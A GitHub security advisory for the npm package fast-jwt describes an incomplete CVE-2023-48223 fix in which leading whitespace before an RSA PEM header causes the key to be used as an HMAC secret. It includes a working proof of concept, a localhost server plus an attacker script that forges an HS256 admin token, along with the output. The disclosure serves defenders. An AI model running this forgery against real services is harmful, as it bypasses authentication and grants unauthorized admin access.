# [C] fast-jwt: Incomplete fix for CVE-2023-48223: JWT Algorithm Confusion via Whitespace-Prefixed RSA Public Key

## Summary
Severity: Critical
Advisory: GHSA-mvf2-f6gm-w987
CVE: CVE-2026-34950
CWE: CWE-20, CWE-327
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-02
Source: https://github.com/advisories/GHSA-mvf2-f6gm-w987
Type: github-advisory

## Affected
- npm: `fast-jwt` — affected >=0 <6.2.0

## Details
### Summary
 The fix for GHSA-c2ff-88x2-x9pg (CVE-2023-48223) is incomplete. The publicKeyPemMatcher regex in fast-jwt/src/crypto.js uses a ^ anchor that is defeated by any leading whitespace in the key string, re-enabling the exact same JWT algorithm confusion attack that the CVE patched.

### Details
 The fix for CVE-2023-48223 (https://github.com/nearform/fast-jwt/commit/15a6e92, v3.3.2) changed the public key matcher from a
  plain string used with .includes() to a regex used with .match():

```
  // Before fix (vulnerable to original CVE)
  const publicKeyPemMatcher = '-----BEGIN PUBLIC KEY-----'
  // .includes() matched anywhere in the string — not vulnerable to whitespace

  // After fix (current code, line 28)
  const publicKeyPemMatcher = /^-----BEGIN(?: (RSA))? PUBLIC KEY-----/
  // ^ anchor requires match at position 0 — defeated by leading whitespace

  In performDetectPublicKeyAlgorithms()
  (https://github.com/nearform/fast-jwt/blob/0ff14a687b9af786bd3ffa870d6febe6e1f13aaa/src/crypto.js#L126-L137):

  function performDetectPublicKeyAlgorithms(key) {
    const publicKeyPemMatch = key.match(publicKeyPemMatcher)  // no .trim()!

    if (key.match(privateKeyPemMatcher)) {
      throw ...
    } else if (publicKeyPemMatch && publicKeyPemMatch[1] === 'RSA') {
      return rsaAlgorithms      // ← correct path: restricts to RS/PS algorithms
    } else if (!publicKeyPemMatch && !key.includes(publicKeyX509CertMatcher)) {
      return hsAlgorithms        // ← VULNERABLE: RSA key falls through here
    }

```
  When the key string has any leading whitespace (space, tab, \n, \r\n), the ^ anchor fails, publicKeyPemMatch is null, and the RSA
  public key is classified as an HMAC secret (hsAlgorithms). The attacker can then sign an HS256 token using the public key as the
  HMAC secret — the exact same attack as CVE-2023-48223.

  Notably, the private key detection function does call .trim() before matching
  https://github.com/nearform/fast-jwt/blob/0ff14a687b9af786bd3ffa870d6febe6e1f13aaa/src/crypto.js#L79:
const pemData = key.trim().match(privateKeyPemMatcher)  // trims — not vulnerable

  The public key path does not. This inconsistency is the root cause.

  Leading whitespace in PEM key strings is common in real-world deployments:
  - PostgreSQL/MySQL text columns often return strings with leading newlines
  - YAML multiline strings (|, >) can introduce leading whitespace
  - Environment variables with embedded newlines
  - Copy-paste into configuration files

### PoC
 Victim server (server.js):

```
  const http = require('node:http');
  const { generateKeyPairSync } = require('node:crypto');
  const fs = require('node:fs');
  const path = require('node:path');
  const { createSigner, createVerifier } = require('fast-jwt');

  const port = 3000;

  // Generate RSA key pair
  const { publicKey, privateKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
  const publicKeyPem = publicKey.export({ type: 'pkcs1', format: 'pem' });
  const privateKeyPem = privateKey.export({ type: 'pkcs8', format: 'pem' });

  // Simulate real-world scenario: key retrieved from database with leading newline
  const publicKeyFromDB = '\n' + publicKeyPem;

  // Write public key to disk so attacker can recover it
  fs.writeFileSync(path.join(__dirname, 'public_key.pem'), publicKeyFromDB);

  const server = http.createServer((req, res) => {
    const url = new URL(req.url, `http://localhost:${port}`);

    // Endpoint to generate a JWT token with admin: false
    if (url.pathname === '/generateToken') {
      const payload = { admin: false, name: url.searchParams.get('name') || 'anonymous' };
      const signSync = createSigner({ algorithm: 'RS256', key: privateKeyPem });
      const token = signSync(payload);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ token }));
      return;
    }

    // Endpoint to check if you are the admin or not
    if (url.pathname === '/checkAdmin') {
      const token = url.searchParams.get('token');
      try {
        const verifySync = createVerifier({ key: publicKeyFromDB });
        const payload = verifySync(token);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(payload));
      } catch (err) {
        res.writeHead(401, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: err.message }));
      }
      return;
    }

    res.writeHead(404);
    res.end('Not found');
  });

  server.listen(port, () => console.log(`Server running on http://localhost:${port}`));
```

  Attacker script (attacker.js):

```
  const { createHmac } = require('node:crypto');
  const fs = require('node:fs');
  const path = require('node:path');

  const serverUrl = 'http://localhost:3000';

  async function main() {
    // Step 1: Get a legitimate token
    const res = await fetch(`${serverUrl}/generateToken?name=attacker`);
    const { token: legitimateToken } = await res.json();
    console.log('Legitimate token payload:',
      JSON.parse(Buffer.from(legitimateToken.split('.')[1], 'base64url')));

    // Step 2: Recover the public key
    // (In the original advisory: python3 jwt_forgery.py token1 token2)
    const publicKey = fs.readFileSync(path.join(__dirname, 'public_key.pem'), 'utf8');

    // Step 3: Forge an HS256 token with admin: true
    // (In the original advisory: python jwt_tool.py --exploit k -pk public_key token)
    const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
    const payload = Buffer.from(JSON.stringify({
      admin: true, name: 'attacker',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600
    })).toString('base64url');
    const signature = createHmac('sha256', publicKey)
      .update(header + '.' + payload).digest('base64url');
    const forgedToken = header + '.' + payload + '.' + signature;

    // Step 4: Present forged token to /checkAdmin
    // 4a. Legitimate RS256 token — REJECTED
    const legRes = await fetch(`${serverUrl}/checkAdmin?token=${encodeURIComponent(legitimateToken)}`);
    console.log('Legitimate RS256 token:', legRes.status, await legRes.json());

    // 4b. Forged HS256 token — ACCEPTED
    const forgedRes = await fetch(`${serverUrl}/checkAdmin?token=${encodeURIComponent(forgedToken)}`);
    console.log('Forged HS256 token:', forgedRes.status, await forgedRes.json());
  }

  main().catch(console.error);
```

  Running the PoC:
  # Terminal 1
  node server.js

  # Terminal 2
  node attacker.js

  Output:
  Legitimate token payload: { admin: false, name: 'attacker', iat: 1774307691 }
  Legitimate RS256 token: 401 { error: 'The token algorithm is invalid.' }
  Forged HS256 token: 200 { admin: true, name: 'attacker', iat: 1774307691, exp: 1774311291 }

  The legitimate RS256 token is rejected (the key is misclassified so RS256 is not in the allowed algorithms), while the attacker's
  forged HS256 token is accepted with admin: true.


### Impact
Applications using the RS256 algorithm, a public key with any leading whitespace before the PEM header, and calling the verify
function without explicitly providing an algorithm, are vulnerable to this algorithm confusion attack which allows attackers to
sign arbitrary payloads which will be accepted by the verifier.
This is a direct bypass of the fix for CVE-2023-48223 / GHSA-c2ff-88x2-x9pg. The attack requirements are identical to the original
CVE: the attacker only needs knowledge of the server's RSA public key (which is public by definition).

## References
- https://github.com/nearform/fast-jwt/security/advisories/GHSA-mvf2-f6gm-w987
- https://nvd.nist.gov/vuln/detail/CVE-2026-34950
- https://github.com/advisories/GHSA-c2ff-88x2-x9pg
- https://github.com/nearform/fast-jwt
